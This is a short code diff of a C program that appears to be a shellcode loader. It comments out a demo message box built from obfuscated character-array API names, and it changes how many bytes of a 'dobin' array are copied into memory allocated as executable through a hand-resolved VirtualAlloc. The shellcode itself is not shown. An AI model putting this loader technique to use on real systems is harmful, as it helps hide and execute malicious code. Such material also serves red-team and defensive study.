@@ -51,6 +51,7 @@ int main()
 	}
 
 	// user32.dll: MessageBoxW()
+	/*
 	char user32_dll_name[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };
 	LPVOID u32_dll = _LoadLibraryA(user32_dll_name);
 	char message_box_name[] = { 'M','e','s','s','a','g','e','B','o','x','W', 0 };
@@ -68,6 +69,7 @@ int main()
 	wchar_t msg_content[] = { 'H','e','l','l','o', ' ', 'W','o','r','l','d','!', 0 };
 	wchar_t msg_title[] = { 'D','e','m','o','!', 0 };
 	_MessageBoxW(0, msg_title, msg_content, MB_OK);
+	*/
 
 	// Copy shellcode
 	// ntdll.dll: VirtualAlloc()
@@ -83,7 +85,7 @@ int main()
 			_In_ DWORD  flProtect)) _GetProcAddress((HMODULE)base, VirtualAlloc_str);
 	if (_VirtualAlloc == NULL) return 4;
 	char *dest = _VirtualAlloc(NULL, 4096, 0x3000, 0x40);
-	for(int n=0; n<272; n++) {
+	for(int n=0; n<347+1; n++) {
 		dest[n] = dobin[n];
 	}
 
